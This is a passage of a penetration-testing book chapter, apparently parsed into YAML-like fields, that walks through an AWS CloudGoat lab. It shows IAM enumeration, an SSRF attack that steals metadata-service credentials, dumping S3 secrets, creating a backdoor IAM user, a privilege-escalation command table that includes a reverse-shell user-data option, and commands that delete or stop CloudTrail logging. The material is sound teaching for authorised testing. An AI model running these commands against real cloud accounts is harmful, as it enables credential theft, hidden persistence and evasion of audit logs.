- en: We can enumerate the access privileges of the access key by running the `enumerate-iam`
    tool, which can be directly cloned from Git by running `sudo git clone https://github.com/andresriancho/enumerate-iam`
    and then `cd enumerate-iam`. We can install the required packages by running `sudo
    pip3 install –r requirements.txt`. Once it is done, we can run the enumerate tool
    by entering `sudo python3 enumerate-iam.py ––access-key xx ––secret-key xx` as
    shown in *Figure 8.35*. This will provide details such as the associated user,
    account ID, and other lists of services.![Text  Description automatically generated](../Images/B17765_08_35.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.35: Enumerating the AWS account with the access and secret keys using
    enumerate-iam.py'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Let’s explore the lambda functions that this ID can access by running `sudo
    aws lambda list-functions ––profile ssrf ––region us-east-1`, which should provide
    us with a list of accessible lambda functions, as shown in *Figure 8.36*:![](../Images/B17765_08_36.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.36: List of functions in AWS Lambda that is available to the profile'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Users might get an error message when running the above command: `An error
    occurred (InvalidSignatureException) when calling the ListFunctions operation:
    Signature expired`. This is due to time issues. It is recommended that testers
    run `sudo apt install ntpupdate` `and sudo ntpdate pool.ntp.org` in the terminal.'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Lambda is exposing an access key and secret key. Let’s get more information
    about the specific function by running `sudo aws lambda get-function –function-name
    cg-lambda-cg<randomid> --profile ssrf –region us-east-1` in the terminal. That
    should return more verbose information about this lambda function:![](../Images/B17765_08_37.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.37: Full details of the specific lambda function with AWS'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We will now configure our Kali Linux with the keys that we got from the lambda
    functions and call this `lambda-solus` as shown in *Figure 8.38*:![](../Images/B17765_08_38.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.38: Configuring the AWS profile within AWS for the new access key
    from the lambda functions'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Let’s explore the instances that are available for this profile by running `sudo
    aws ec2 describe-instances –region us-east-1 –profile lambda-solus`. That should
    list the instance details along with the public IP address as shown in *Figure
    8.39*:![](../Images/B17765_08_39.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.39: Accessing the cloud instance details through the lambda-solus
    profile'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once we have the public IP address, we can access the instance on port `80`,
    and you should be able to see the error message on the server seen in *Figure
    8.40*:![](../Images/B17765_08_40.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.40: Accessing the web server on the public IP'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Attackers can choose to run any type of scanner, such as Nikto or OWASP ZAP,
    on the IP address. When the attackers can trick the web application to make HTTP
    requests on behalf of them to a specific URL, then the application is vulnerable
    to SSRF. In our case, adding `/?url=<attacker controlled URL>` to the IP address
    allows us to control the web application to make HTTP requests on our behalf.
    Let’s use the application to invoke the metadata API to obtain the credentials
    by adding the URL `http://168.254.169.254/latest/meta-data/iam/security/security-credentials/<Nameofthefile>`
    to the parameter shown in *Figure 8.41*, which should retrieve the temporary credentials
    that can be leveraged by the testers:![](../Images/B17765_08_41.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.41: Performing an SSRF attack on the web application to retrieve the
    temporary credentials'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Configure the AWS profile within Kali Linux with another profile by running
    `sudo aws configure –profile ec2-temp` as shown in *Figure 8.42*, and additionally,
    make sure the `aws_session_token` is added to the `aws credentials` file and then
    access the S3 buckets by running `sudo aws s3 ls –profile ec2-temp.` That provides
    a bucket called `cg-secret-s3-bucket-<randomid>`:![](../Images/B17765_08_42.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.42: Listing the S3 buckets with the temporary credentials'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Let’s download the entire contents of this bucket by running `sudo aws s3 sync
    s3://<bucketname><folder><file> location –profile` as shown in the following screenshot.
    Yay! We now have the high-privileged user access details from this bucket. This
    is similar to gaining domain administrative access during internal penetration
    testing:![](../Images/B17765_08_43.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.43: Downloading the secrets and configuring Kali Linux with the admin
    profile'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After configuring AWS with the `ec2-admin` profile within Kali Linux, attackers
    will now be able to perform any actions in the EC2 environment. As an example,
    we can now view all the users by running `sudo aws iam list-users –profile ec2—admin`
    as shown in *Figure 8.44*:![Text  Description automatically generated](../Images/B17765_08_44.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.44: Enumerating the users from the admin profile'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: View the attached policies specific to the users by running `sudo iam list-attached-user-policies
    –username <nameofuser> --profile ec2-admin` as shown in *Figure 8.45*:![](../Images/B17765_08_45.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.45: Accessing the user-attached policies'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note that the following two steps are only for the demonstration purpose of
    how to create an `aws iam` access key and user using the command line. Testers
    must be aware that if these steps are performed on a CloudGoat deployed AWS environment,
    then destroying the instance will not be possible since CloudGoat can only delete
    instances that it creates with the script.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: You should now be able to change any user’s secret key by running `sudo iam
    create-access-key –username <Username> --region us-east-1 –profile ec2-admin`:![Text  Description
    automatically generated](../Images/B17765_08_46.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.46: Creating a new access key for a user'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Additionally, you can create a new user as a backdoor to access the environment
    by running `sudo aws iam create-user –username backdoor –profile ec2-admin`, and
    that should come up with the new user created with an access key and a secret
    access key as shown in *Figure 8.47*:![Text  Description automatically generated](../Images/B17765_08_47.png)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Figure 8.47: Creating a new user for backdoor access'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Testers can now return to the CloudGoat Docker image and destroy the AWS setup
    by running `./cloudgoat.py destroy all` in the terminal.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '*Table 8.3* provides useful command references that pentesters can leverage
    during AWS penetration testing:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Description** | **Command reference** |'
  prefs: []
  type: TYPE_TB
- en: '| Creates a new policy version | `aws iam create-policy-version –policy-arn
    target_policy_arn –policy-document file://path/to/ /policy.json –set-as-default`
    |'
  prefs: []
  type: TYPE_TB
- en: '| Sets the default policy version to an existing version | `aws iam set-default-policy-version
    –policy-arn target_policy_arn –version-id v2` |'
  prefs: []
  type: TYPE_TB
- en: '| Creates an EC2 instance with an existing instance profile | `aws ec2 run-instances
    –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip
    –key-name my_ssh_key –security-group-ids sg-123456``aws ec2 run-instances –image-id
    ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip
    –user-data file://script/with/reverse/shell.sh` |'
  prefs: []
  type: TYPE_TB
- en: '| Creates a new user access key | `aws iam create-access-key –user-name target_user`
    |'
  prefs: []
  type: TYPE_TB
- en: '| Creates a new login profile | `aws iam create-login-profile –user-name target_user
    –password ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    –no-password-reset-required` |'
  prefs: []
  type: TYPE_TB
- en: '| Updates an existing login profile | `aws iam update-login-profile –user-name
    target_user –password ''&#124;[3rxYGGl3@''~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;&#124;,lyTKOLG7J[qH$LV5U<9''O~Z",jJ[iT-D^(''
    -–no-password-reset-required` |'
  prefs: []
  type: TYPE_TB
- en: '| Attaches a policy to a:UserGroupRole | `aws iam attach-user-policy –user-name
    my_username –policy-arn``arn:aws:iam::aws:policy/AdministratorAccess aws iam attach-group-policy
    –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess``aws
    iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
    |'
  prefs: []
  type: TYPE_TB
- en: '| Creates/updates an inline policy for a:UserGroupRole | `aws iam put-user-policy
    –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/policy.json``aws
    iam put-group-policy –group-name group_i_am_in –policy-name group_inline_policy
    –policy-document file://path/to/policy.json>``aws iam put-role-policy –role-name
    role_i_can_assume –policy-name role_inline_policy –policy-document file://path/to/policy.json`
    |'
  prefs: []
  type: TYPE_TB
- en: '| Adds a user to a group | `aws iam add-user-to-group –-group-name target_group
    –-user-name username` |'
  prefs: []
  type: TYPE_TB
- en: '| Updates the `AssumeRolePolicyDocument` of a role | `aws iam update-assume-role-policy
    –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json`
    |'
  prefs: []
  type: TYPE_TB
- en: '| Updates the code of an existing lambda function | `aws lambda update-function-code
    -–function-name target_function –zip-file fileb://my/lambda/code/zipped.zip` |'
  prefs: []
  type: TYPE_TB
- en: 'Table 8.3: Useful AWS commands during penetration testing'
  prefs: []
  type: TYPE_NORMAL
- en: Obfuscating CloudTrail logs
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'CloudTrail is a service within Amazon that monitors any actions that are done
    by users. Assuming attackers now have high-privileged access to the environment,
    they will be able to modify the settings by performing the following actions:'
  prefs: []
  type: TYPE_NORMAL
- en: Identify the CloudTrail details by running `sudo aws cloudtrail describe-details
    –profile <profile name>`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Attackers can choose to perform the removal of trails by running `sudo aws cloudtrail
    delete-trail --name cloudgoat_trail --profile <Profile name>`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Alternatively, they can stop the logging by running `sudo aws cloudtrail stop-logging
    --name cloudgoat_trail --profile <Profile name>`. However, it will trigger an
    alert in GuardDuty (a threat detection service within AWS) about the logs not
    being captured.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: We have explored the important aspects of cloud penetration testing with some
    practical examples. Pentesters should always consider any cloud infrastructure
    as part of the internal/external scope to ensure that objectives are met.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we took a quick tour of different types of cloud services and
    attacks against those services. We took a deep dive into AWS-specific security
    misconfigurations, particularly the exploitation of remote web application vulnerabilities
    through the logs from the load balancer, and took advantage of a misconfigured
    S3 bucket to gain access to internal EC2 instances. Further, we exploited the
    privileges of the instance in gaining the database credentials and also explored
    metadata service header injection attacks. We learned how to create a backdoor
    user in an AWS environment through an SSRF attack. We then examined some of the
    useful command-line functions that can be utilized in AWS penetration testing.
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we will focus more on how to bypass **Network Access Control**
    (**NAC**) and antivirus software, **User Account Control** (**UAC**), and Windows
    operating system controls. We will also explore toolsets such as the Veil Framework
    and Shellter.
  prefs: []
  type: TYPE_NORMAL
